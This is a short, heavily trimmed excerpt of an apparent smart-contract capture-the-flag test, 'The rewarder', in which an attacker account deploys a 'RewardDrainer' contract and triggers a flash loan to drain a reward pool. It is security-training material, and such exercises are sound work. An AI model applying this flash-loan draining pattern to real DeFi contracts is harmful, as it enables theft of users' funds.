...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const rewardDrainerFactory = await ethers.getContractFactory('RewardDrainer',
            attacker);
        const rewardDrainer = await rewardDrainerFactory.deploy(
        ...
        await rewardDrainer.connect(attacker).performFlashLoan(TOKENS_IN_LENDER_POOL);
    });
